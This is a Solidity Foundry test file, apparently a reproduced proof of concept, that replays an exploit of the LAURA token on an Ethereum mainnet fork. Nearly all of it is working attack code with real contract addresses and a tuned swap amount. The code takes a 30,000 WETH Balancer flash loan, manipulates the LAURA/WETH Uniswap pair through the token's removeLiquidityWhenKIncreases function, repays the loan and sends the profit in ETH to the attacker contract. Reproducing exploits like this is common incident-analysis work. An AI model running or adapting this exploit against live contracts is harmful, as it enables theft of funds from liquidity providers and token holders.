// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../utils/interface.sol";



address constant uniV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant pairLAURA_WETH = 0xb292678438245Ec863F9FEa64AFfcEA887144240;
address constant balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
uint256 constant LOAN_AMOUNT = 30_000 ether;

uint256 constant MAGIC_NUMBER = 11_526_249_223_479_392_795_400;


contract LAURAToken_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("mainnet", 21_529_888 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);
        AttackContractA attackCA = new AttackContractA();

        console.log("Final balance in ETH :", address(attackCA).balance);
    }
}


contract AttackContractA {
    constructor(){
        //1.创建AttackContractB合约
        AttackContractB attackCB = new AttackContractB();
        //2.调用AttackContractB合约的attack函数

        attackCB.attack();
    }

    receive() external payable {}
}

contract AttackContractB {
    using SafeMath  for uint;
    constructor(){
        //1.调用WETH合约的approve函数，被授权是uniswap v2 router 2 合约。 amount 是 MAX(uint256)
        IFS(weth).approve(uniV2Router, type(uint256).max);
    }

    function attack() external {
        console.log("----->Attack Begin");

        //1.call LAURA approve( uniswap v2 router 2, MAX(uint256) )
        console.log("----->LAURA approve");
        address LAURA = IFS(pairLAURA_WETH).token0();
        IFS(LAURA).approve(uniV2Router, type(uint256).max);

        //2.call BalancerVault flashLoan( ATTACKER_CONTRACT_B, WETH, amount =30,000 * 10 ^ 18, receiveflashdata  )
        console.log("----->BalancerVault flashLoan");
        address[] memory tokens = new address[](1);
        tokens[0] = weth;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = LOAN_AMOUNT;
        IFS(balancerVault).flashLoan(
            address(this),
            tokens,
            amounts,
            hex'000000000000000000000000b292678438245ec863f9fea64affcea887144240' // pairLAURA_WETH
        );

        //3.call WETH withdraw
        console.log("----->WETH withdraw");
        uint256 attackCA_weth_bal = IERC20(weth).balanceOf(address(this));
        IFS(weth).withdraw(attackCA_weth_bal);
        (bool success,) = msg.sender.call{value: attackCA_weth_bal}("");
        require(success, "Not success");
    }


    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) external {
        address LAURA = IFS(pairLAURA_WETH).token0();
        //staticCall 了 weth 的地址,这里常量声明了。
        uint256 attackCB_weth_bal = IERC20(weth).balanceOf(address(this));
        uint256 pair_LAURA_WETH_weth_bal = IERC20(weth).balanceOf(pairLAURA_WETH);

        console.log("attackCB_weth_bal:", attackCB_weth_bal);
        console.log("pair_LAURA_WETH_weth_bal:", pair_LAURA_WETH_weth_bal);

        //1.call Uniswap V2: Router 2 swapExactTokensForTokensSupportingFeeOnTransferTokens
        console.log("----->Uniswap V2: Router 2 swapExactTokensForTokensSupportingFeeOnTransferTokens");
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = LAURA;
        IFS(uniV2Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            MAGIC_NUMBER,     // amountIn
            0,                // amountOutMin
            path,             // path
            address(this),    // to
            type(uint256).max
        );
        attackCB_weth_bal = IERC20(weth).balanceOf(address(this));
        uint256 attackCB_LAURA_bal = IERC20(LAURA).balanceOf(address(this));

        console.log("attackCB_weth_bal:", attackCB_weth_bal);
        console.log("attackCB_LAURA_bal:", attackCB_LAURA_bal);

        //2.Uniswap V2: Router 2 addLiquidty
        console.log("----->Uniswap V2: Router 2 addLiquidty");

        uint256 pair_lp_total_supply = IFS(pairLAURA_WETH).totalSupply();
        console.log("pair_lp_total_supply:", pair_lp_total_supply);

        IFS(uniV2Router).addLiquidity(
            LAURA,
            weth,
            attackCB_LAURA_bal,
            MAGIC_NUMBER,
            0,
            0,
            address(this),
            type(uint256).max
        );

        uint256 attackCB_pair_lp_bal = IFS(pairLAURA_WETH).balanceOf(address(this));
        console.log("attackCB_pair_lp_bal:", attackCB_pair_lp_bal);

        pair_lp_total_supply = IFS(pairLAURA_WETH).totalSupply();
        console.log("pair_lp_total_supply:", pair_lp_total_supply);
        calculateBurnAmounts();
        //3.LURA.removeLiquidityWhenKIncreases
        console.log("----->LURA.removeLiquidityWhenKIncreases");
        IFS(LAURA).removeLiquidityWhenKIncreases();
        calculateBurnAmounts();
        attackCB_LAURA_bal = IERC20(LAURA).balanceOf(address(this));
        console.log("attackCB_LAURA_bal:", attackCB_LAURA_bal);

        //4.Uniswap V2: LAURA 5 approve
        console.log("----->Uniswap V2: LAURA 5 approve");
        IFS(pairLAURA_WETH).approve(uniV2Router, type(uint256).max);

        //5.Uniswap V2: Router 2 removeLiquidity
        console.log("----->Uniswap V2: Router 2 removeLiquidity");
        uint256 attackCB_pairLAURA_WETH_bal = IERC20(pairLAURA_WETH).balanceOf(address(this));
        IFS(uniV2Router).removeLiquidity(
            LAURA,
            weth,
            attackCB_pairLAURA_WETH_bal,
            0,
            0,
            address(this),
            type(uint256).max
        );
        console.log("After remove liquidity");

        attackCB_LAURA_bal = IERC20(LAURA).balanceOf(address(this));
        console.log("attackCB_LAURA_bal:", attackCB_LAURA_bal);

        //6.Uniswap V2: Router 2 swapExactTokensForTokensSupportingFeeOnTransferTokens
        console.log("----->Uniswap V2: Router 2 swapExactTokensForTokensSupportingFeeOnTransferTokens");
        attackCB_LAURA_bal = IERC20(LAURA).balanceOf(address(this));
        path[0] = LAURA;
        path[1] = weth;
        IFS(uniV2Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            attackCB_LAURA_bal,
            0,
            path,
            address(this),
            type(uint256).max
        );
        attackCB_LAURA_bal = IERC20(LAURA).balanceOf(address(this));
        attackCB_weth_bal = IERC20(weth).balanceOf(address(this));
        console.log("attackCB_LAURA_bal:", attackCB_LAURA_bal);
        console.log("attackCB_weth_bal:", attackCB_weth_bal);


        //7.WETH transfer
        console.log("----->repay WETH transfer");
        IFS(weth).transfer(balancerVault, LOAN_AMOUNT);
        attackCB_weth_bal = IERC20(weth).balanceOf(address(this));
        console.log("attackCB_weth_bal:", attackCB_weth_bal);

    }

    function calculateBurnAmounts() internal {
        // 获取 pair 合约的储备量和总供应量
        address _token0 = IFS(pairLAURA_WETH).token0();
        address _token1 = IFS(pairLAURA_WETH).token1();
        uint balance0 = IFS(_token0).balanceOf(address(pairLAURA_WETH));
        uint balance1 = IFS(_token1).balanceOf(address(pairLAURA_WETH));

        // 获取当前合约在 pair 中的流动性余额
        uint256 liquidity = IFS(pairLAURA_WETH).balanceOf(address(this));

        // 获取 pair 合约的总供应量
        uint256 _totalSupply = IFS(pairLAURA_WETH).totalSupply();

        // 计算 burn 后可以得到的 token0 和 token1 的数量
        uint256 amount0 = liquidity.mul(balance0) / _totalSupply;
        uint256 amount1 = liquidity.mul(balance1) / _totalSupply;

        // 打印计算结果
        console.log("if_removeLq_calculateBurnAmounts");
        console.log("Calculated amount of token0(LURA):", amount0);
        console.log("Calculated amount of token1(WETH):", amount1);
    }

    receive() external payable {}
}




interface IFS is IERC20 {
    // LAURA 代币的特殊函数
    function removeLiquidityWhenKIncreases() external;

    // WETH 合约的 withdraw() 方法
    function withdraw(uint256 wad) external;

    // UniswapV2 Pair 相关函数
    function token0() external view returns (address);

    function token1() external view returns (address);

    // Balancer Vault 的闪电贷接口
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;

    // UniswapV2Router 交易和流动性管理
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}




library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }
}
